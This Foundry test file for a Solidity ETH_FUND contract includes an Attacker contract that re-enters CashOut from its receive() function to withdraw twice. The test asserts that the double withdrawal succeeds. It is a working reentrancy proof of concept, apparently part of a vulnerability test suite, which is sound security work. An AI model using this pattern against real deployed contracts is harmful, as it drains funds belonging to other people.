
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_FUND} from "../src/ETH_FUND.sol";
import {Log} from "../src/Log.sol";

contract TestReentrancyETH_FUND is Test {
    ETH_FUND public ethFund;
    Log public logContract;
    Attacker public attacker;

    function setUp() public {
        logContract = new Log();
        ethFund = new ETH_FUND(address(logContract));
        attacker = new Attacker(address(ethFund));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);
        vm.assume(attackVal <= address(this).balance);

        vm.deal(address(ethFund), attackVal * 2);
        vm.deal(address(attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        attacker.setupAttack{value: attackVal}(attackVal);
        vm.roll(block.number + 1);
        attacker.attack(attackVal / 2);

        assertTrue(attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_FUND public ethFund;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public withdrawAmount;

    constructor(address victimAddress) {
        ethFund = ETH_FUND(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        ethFund.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        withdrawAmount = val;
        uint256 initialAttackerBalance = address(this).balance;
        ethFund.CashOut(val);
        
        uint256 finalAttackerBalance = address(this).balance;
        if (finalAttackerBalance >= initialAttackerBalance + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            ethFund.CashOut(withdrawAmount);
        }
    }
}
